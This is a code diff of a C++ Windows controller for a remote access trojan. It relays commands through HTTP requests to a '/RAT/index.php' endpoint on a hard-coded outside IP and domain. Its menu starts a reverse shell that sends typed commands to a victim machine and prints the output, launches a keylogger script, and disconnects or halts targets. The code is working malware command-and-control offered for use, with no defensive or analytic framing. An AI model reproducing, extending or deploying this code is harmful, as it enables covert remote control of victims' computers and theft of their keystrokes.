@@ -1,98 +1,66 @@
-//compile ->  cl /EHsc server.cpp /link ws2_32.lib /OUT:server.exe
+// cl /EHsc .\testconsole.cpp /link ws2_32.lib /OUT:testconsole.exe
 #include <winsock2.h>
 #include <iostream>
 #include <ws2tcpip.h>
 #include <Windows.h>
 #include <string>
 #include <thread>
-#include <tuple>
-#include <atomic>
+#include <sstream>
+#include <mutex>
 
 using namespace std;
 
-#define MAX_IP_LENGTH 16
-#define MAX_TEXT_LENGTH 256
-
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 int argc_global;
 char **argv_global;
-SOCKET listenSocket;
-SOCKET clientSocket;
-bool targetconnected = false;
 
+
+bool targetconnected = false;
+#define MAX_IP_LENGTH 16
+#define MAX_TEXT_LENGTH 256
 char ipAddress[MAX_IP_LENGTH], randomText[MAX_TEXT_LENGTH];
 char os;
 
+SOCKET sock;
+std::mutex mtx;
+std::mutex socketMutex; 
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-int socket_setup();
-string get_client_ip(SOCKET clientSocket);
-void safe_closesocket(SOCKET& s);
+bool socket_setup(SOCKET &clientSocket);
+void safe_closesocket(SOCKET &clientSocket);
 
-void send_data(SOCKET clientSocket, const string &data);
-void send_data(SOCKET clientSocket, int data);
-string receive_data(SOCKET clientSocket);
+void send_data(SOCKET &clientSocket, const string &filename ,const string &data);
+string receive_data(SOCKET &clientSocket, const string &filename);
 
 void os_detection();
 bool getdata_from_file();
-int Get_menu_option();
+char Get_menu_option();
 
-int Rev_Shell();
+int Rev_Shell(SOCKET &clientSocket);
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 int main(int argc, char *argv[]) 
 {
     argc_global = argc;
     argv_global = argv;
-    
-    if (socket_setup() != 0) return 1;
-    
+
     bool loop = true;
     while(loop)
     {
         switch (Get_menu_option())
         {
-            case 1:                                                                         //connect
+            case '1':                                                                   //connect
             {   
-                if(!targetconnected)
-                {    
-                    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR)
-                    {
-                        std::cerr << "listen failed with error: " << WSAGetLastError() << std::endl;
-                        safe_closesocket(listenSocket);
-                        WSACleanup();
-                        
-                        return 1;
-                    }               
-                    cout << "\n>> Waiting for incoming connections..." << endl;
-
-    /////////////////////////////////////////////////////change this when internet////////////////////////////////////////////////
-    // can make if(checkip) and do something....
-                    clientSocket = accept(listenSocket, nullptr, nullptr);                
-                    if(get_client_ip(clientSocket) == "127.0.0.1")
-                    {   
-                        cout << ">> " << get_client_ip(clientSocket) << " connected." << endl;
-                        targetconnected = true;
-                    }
-                    else 
-                    {
-                        cout << ">> " << get_client_ip(clientSocket) << " Not allowed to connect." << endl;
-                        closesocket(clientSocket);
-                    }
-                }
-/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-                else
-                {
-                    cout << ">> Already connected to a target." << endl;
-                    system("pause");                    
-                }
-
+                targetconnected = socket_setup(sock);
+                send_data(sock,"from_server.txt","`");
+                //system("pause");
                 break;
             }
             
-            case 2:                                                                     //Rev shell
+            case '2':                                                                   //Rev shell
             {
-                if (targetconnected && clientSocket != INVALID_SOCKET) 
+                if (targetconnected) 
                 {
-                    send_data(clientSocket, 2);
+                    send_data(sock,"from_server.txt","2");
                     cout << ">> Sent " << endl;
                 } 
                 else
@@ -101,18 +69,16 @@ int main(int argc, char *argv[])
                     system("pause");
                 }
                 
-                Rev_Shell();
+                Rev_Shell(sock);
 
                 break;
             }
             
-            case 3:                                                                     //Execute keylogger
+            case '3':                                                                   //Execute keylogger
             {
-                if (targetconnected && clientSocket != INVALID_SOCKET)
+                if (targetconnected)
                 {
-                    send_data(clientSocket, 3);
-                    send_data(clientSocket, "hello.vbs");
-
+                    send_data(sock,"from_server.txt", "3hello.vbs");
                     cout << ">> Sent " << endl;
                 }
                 else cout << ">> Target not connected or socket invalid!!" << endl;
@@ -120,29 +86,30 @@ int main(int argc, char *argv[])
 
                 break;
             }
-            case 99:                                                                    //DC Current target
+            case '~':                                                                   //DC Current target
             {
                 if (targetconnected)
                 {
-                    send_data(clientSocket, 99);
-                    safe_closesocket(clientSocket);
-                    safe_closesocket(listenSocket);
+                    send_data(sock,"from_server.txt","~");
                     targetconnected = false;
 
-                    if (socket_setup() != 0) return 1;
+                    if (socket_setup(sock) == false)
+                    {
+                        cout << ">> Fuk" << endl;
+                        return 1;
+                    }
                     cout << ">> Disconnecting client..." << endl << endl;
-                } 
+                }
                 else cout << ">> No client connected to disconnect." << endl;
                 system("pause");
                 
                 break;
             }
-            case 11:                                                                    //DC Current target and stop its code execution
+            case '#':                                                                   //DC Current target and stop its code execution
             {
                 if (targetconnected)
                 {
-                    send_data(clientSocket, 11);
-                    safe_closesocket(clientSocket);
+                    send_data(sock,"from_server.txt","#");
                     targetconnected = false;
                     
                     cout << ">> Disconnecting client and requesting stop..." << endl << endl;
@@ -152,13 +119,11 @@ int main(int argc, char *argv[])
 
                 break;
             }
-            case 0:                                                                     //Exit console
+            case '0':                                                                   //Exit console
             {
 
                 if(!targetconnected)
                 {
-                    safe_closesocket(clientSocket);
-                    safe_closesocket(listenSocket);
 
                     WSACleanup();
                     cout << ">> Exiting..." << endl << endl;
@@ -179,80 +144,202 @@ int main(int argc, char *argv[])
             }
         }
     }   
-
     return 0;
 }
 
-int socket_setup()
+bool socket_setup(SOCKET &clientSocket)
 {
+    bool connected = false;
+
     WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+    {
         std::cerr << "WSAStartup failed.\n";
-        return 1;
+        return false;
     }
 
-    listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (listenSocket == INVALID_SOCKET) {
-        std::cerr << "socket failed with error: " << WSAGetLastError() << std::endl;
+    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (clientSocket == INVALID_SOCKET)
+    {
+        std::cerr << "socket failed.\n";
         WSACleanup();
-        return 1;
+        return false;
     }
 
     sockaddr_in serverAddr;
     serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(8081);
-    serverAddr.sin_addr.s_addr = INADDR_ANY;
+    serverAddr.sin_port = htons(80);
+    serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");
 
-    int reuse = 1;
-    if (setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse)) == SOCKET_ERROR) {
-        std::cerr << "setsockopt failed with error: " << WSAGetLastError() << std::endl;
-        safe_closesocket(listenSocket); // Use safe_closesocket here
-        WSACleanup();
-        return 1;
-    }
-
-    if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
-        std::cerr << "bind failed with error: " << WSAGetLastError() << std::endl;
-        safe_closesocket(listenSocket); // Use safe_closesocket here
-        WSACleanup();
-        return 1;
-    }
-
-    return 0;
-
-}
-
-void send_data(SOCKET clientSocket, const string &data)                                         // Doesnot send special data 
-{
-    int bytesSent = send(clientSocket, data.c_str(), data.length(), 0);
-    if (bytesSent == SOCKET_ERROR) cerr << "Send failed with error: " << WSAGetLastError() << endl;
-}
-
-void send_data(SOCKET clientSocket, int data)
-{
-    // Convert the integer to a byte stream
-    int bytesSent = send(clientSocket, reinterpret_cast<const char*>(&data), sizeof(data), 0);
-    if (bytesSent == SOCKET_ERROR) 
+    connected = false;
+    while (!connected)
     {
-        cerr << "Send failed with error: " << WSAGetLastError() << endl;
+        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
+        {
+            int error = WSAGetLastError();
+            if (error != WSAECONNREFUSED)
+            {
+                std::stringstream ss;
+                ss << "Connection failed with error: " << error << " (" << gai_strerror(error) << "). Retrying in 2 seconds...\n";
+                std::cerr << ss.str();
+            }   
+            else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
+            Sleep(2000);
+        }
+        else
+        {
+            //std::cout << "Connected to the server!\n";
+            connected = true;
+        }
+    }
+    return true;
+}
+
+void send_data(SOCKET &clientSocket, const string &filename ,const string &data)
+{
+    {
+        lock_guard<mutex> lock1(socketMutex); 
+        
+        socket_setup(clientSocket);
+
+        string whole_data = filename+data;
+        string httpRequest = "POST /RAT/index.php HTTP/1.1\r\n";
+        httpRequest += "Host: arth.imbeddex.com\r\n";
+        httpRequest += "Content-Length: " + to_string(whole_data.length()) + "\r\n";
+        httpRequest += "Content-Type: application/octet-stream\r\n";
+        httpRequest += "Connection: close\r\n\r\n";
+        httpRequest += whole_data;                                                                // Append the actual data
+
+
+        int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
+        if (bytesSent == SOCKET_ERROR)
+        {
+            int error = WSAGetLastError();
+            cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
+        }
+    
+        ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////
+
+        char buffer[4096]; // Increased buffer size
+        string receivedData;
+        int bytesReceived;
+
+        do {
+            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator
+
+            if (bytesReceived > 0) {
+                buffer[bytesReceived] = '\0';
+                receivedData += buffer; // Append to the received data
+            } else if (bytesReceived == 0) {
+                cerr << "Connection closed by server." << endl;
+                break; // Exit the loop on clean close
+            } else {
+                int error = WSAGetLastError();
+                if (error != WSAECONNRESET) {
+                    cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
+                }
+                break; // Exit loop on error
+            }
+        } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full
+
+        //cout << "\n\nReceived: " << receivedData << endl;
+
+        ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////
+
+        safe_closesocket(clientSocket);
     }
 }
 
-string receive_data(SOCKET clientSocket)
+string receive_data(SOCKET &clientSocket, const string &filename)
 {
-    char buffer[1024];                                                                           // Buffer to store received data
-    int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
-
-    if (bytesReceived > 0)
     {
-        buffer[bytesReceived] = '\0';                                                           // Null-terminate the string
-        string receivedData(buffer);                                                            // Store the data in a string
-        return receivedData;
-    }
-    else if (bytesReceived == 0) cerr << "Connection closed by server." << std::endl;
-    else cerr << "Receive failed with error: " << WSAGetLastError() << std::endl;
+        lock_guard<mutex> lock1(socketMutex);
 
-    return "";                                                                                  // Return an empty string in case of error or connection closure
+        socket_setup(clientSocket);
+
+        string httpRequest = "GET /RAT/"+filename+" HTTP/1.1\r\n";
+        httpRequest += "Host: arth.imbeddex.com\r\n";
+        httpRequest += "Connection: close\r\n\r\n";
+
+        //cout<< httpRequest<<endl;
+
+        int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
+        if (bytesSent == SOCKET_ERROR)
+        {
+            int error = WSAGetLastError();
+            cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
+        }
+
+        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+        char buffer[4096]; // Increased buffer size
+        string receivedData;
+        int bytesReceived;
+
+        do {
+            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator
+
+            if (bytesReceived > 0) {
+                buffer[bytesReceived] = '\0';
+                receivedData += buffer; // Append to the received data
+            } else if (bytesReceived == 0) {
+                cerr << "Connection closed by server." << endl;
+                break; // Exit the loop on clean close
+            } else {
+                int error = WSAGetLastError();
+                if (error != WSAECONNRESET) {
+                    cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
+                }
+                break; // Exit loop on error
+            }
+        } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full
+
+        //cout << "\n\nReceived: \n" << receivedData << endl;
+
+        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+        // Robust HTTP response parsing
+        size_t headerEnd = receivedData.find("\r\n\r\n");
+        if (headerEnd == string::npos) {
+            cerr << "Invalid HTTP receivedData: No header/body separator found." << endl;
+            return "";
+        }
+
+        string body = receivedData.substr(headerEnd + 4);
+
+        //Handle chunked transfer encoding (if present)
+        size_t transferEncodingPos = receivedData.find("Transfer-Encoding: chunked");
+        if (transferEncodingPos != string::npos)
+        {
+            string unchunkedBody;
+            istringstream bodyStream(body);
+            string chunkLengthStr;
+
+            while (getline(bodyStream, chunkLengthStr))
+            {
+                if (chunkLengthStr.empty() || chunkLengthStr == "\r") continue;
+
+                size_t chunkSize;
+                stringstream ss;
+                ss << hex << chunkLengthStr;
+                ss >> chunkSize;
+
+                if (chunkSize == 0) break; // End of chunked data
+
+                string chunkData(chunkSize, '\0');
+                bodyStream.read(&chunkData[0], chunkSize);
+
+                unchunkedBody += chunkData;
+                bodyStream.ignore(2); // Consume CRLF after chunk
+            }
+            body = unchunkedBody;
+        }
+        safe_closesocket(clientSocket);
+
+        //send_data(clientSocket, "from_server.txt", "`");
+        return body;
+
+    }
 }
 
 void os_detection()
@@ -302,9 +389,8 @@ bool getdata_from_file()
     return true;
 }
 
-int Rev_Shell()
+int Rev_Shell(SOCKET &clientSocket)
 {
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
     atomic<bool> processFinished(false);
     
@@ -312,10 +398,29 @@ int Rev_Shell()
     {
         while (!processFinished.load())
         {
-            string data = receive_data(clientSocket);
-            if (data.empty()) break;                                                            // Client has disconnected or there was an error
-            cout << data;
-            Sleep(10);                                                                          // Sleep for a short time to prevent 100% CPU usage
+            //{
+                //lock_guard<mutex> lock1(socketMutex);
+                //mtx.lock();
+                Sleep(100);
+
+                if(receive_data(clientSocket,"from_client.txt")[0] == '`')
+                {
+                    
+                    //cout<< "waiting for rev shell data " << endl;
+                    continue;
+                }
+                else 
+                {
+                    string data = receive_data(clientSocket, "from_client.txt");
+                    send_data(clientSocket, "from_client.txt", "`");
+                    
+                    if (data.empty()) break;                                                            // Client has disconnected or there was an error
+                    cout << data << endl;
+                }
+            
+                //mtx.unlock();
+            //}
+            Sleep(100);                                                                            // Sleep for a short time to prevent 100% CPU usage
         }
     });
 
@@ -324,17 +429,21 @@ int Rev_Shell()
         string cmd;
         while (!processFinished.load())                                                                     
         {
-            if (getline(cin, cmd))                                                              //getline to allow multi-word commands
+
+
+            if (getline(cin, cmd))                                                                  //getline to allow multi-word commands
             {
                 if (cmd == "exit")
                 {
-                    send_data(clientSocket, "exit");
+                    send_data(clientSocket, "from_server.txt" ,"exit");
+                    
                     processFinished.store(true);
                     break;
                 }
-                send_data(clientSocket, cmd);
+                if(!cmd.empty()) send_data(clientSocket, "from_server.txt" ,cmd);
             }
-            Sleep(10);
+
+            Sleep(100);
         }
     });
 
@@ -348,9 +457,9 @@ int Rev_Shell()
     return 0;
 }
 
-int Get_menu_option()
+char Get_menu_option()
 {
-    int option = 0;
+    char option;
 
     system("cls");
     cout << R"(
@@ -375,7 +484,7 @@ int Get_menu_option()
                                                 
                                                 [::] Menu :) [::]
 
-                                    Connect a target                        1)";
+                                    Start communication                     1)";
     
     if(!targetconnected) cout << "  [-]\n";
     else cout << "  [o]\n";
@@ -386,8 +495,8 @@ int Get_menu_option()
                                                                             )";            
                                     
     if(targetconnected)cout << R"(
-                                    Disconnect Current Target              [99]
-                                    DC target & stop its code              {11}
+                                    Make Target try again after 5 sec      [~]
+                                    DC target & stop its code              {#}
                                                                             )";
 
     cout << R"(
@@ -396,38 +505,25 @@ int Get_menu_option()
     cout << "\n\n>> ";
     cin >> option;
 
-    if(cin.fail())
-    {
-        cin.clear();
-        cout << ">> INT Bro, Int ( -_- )" << endl << endl;
-        system("pause");
-    }
+    // if(cin.fail())
+    // {
+    //     cin.clear();
+    //     cout << ">> INT Bro, Int ( -_- )" << endl << endl;
+    //     system("pause");
+    // }
 
 
     return option;
 
 }
 
-string get_client_ip(SOCKET clientSocket)
+void safe_closesocket(SOCKET &clientSocket)
 {
-    sockaddr_in clientAddr;
-    int clientAddrLen = sizeof(clientAddr);
-    if (getpeername(clientSocket, (sockaddr*)&clientAddr, &clientAddrLen) == SOCKET_ERROR) {
-        cerr << "getpeername failed." << endl;
-        return "";
-    }
-
-    // Convert IP address to string
-    char clientIP[INET_ADDRSTRLEN];
-    inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, sizeof(clientIP));
-    return string(clientIP);
-}
-
-void safe_closesocket(SOCKET& s) 
-{
-    if (s != INVALID_SOCKET) {
-        shutdown(s, SD_BOTH); // Prevent further sends/receives
-        closesocket(s);
-        s = INVALID_SOCKET; // Set to INVALID_SOCKET to prevent double closing
+    if (clientSocket != INVALID_SOCKET)
+    {
+        shutdown(clientSocket, SD_BOTH);
+        closesocket(clientSocket);
+        
+        clientSocket = INVALID_SOCKET;
     }
 }
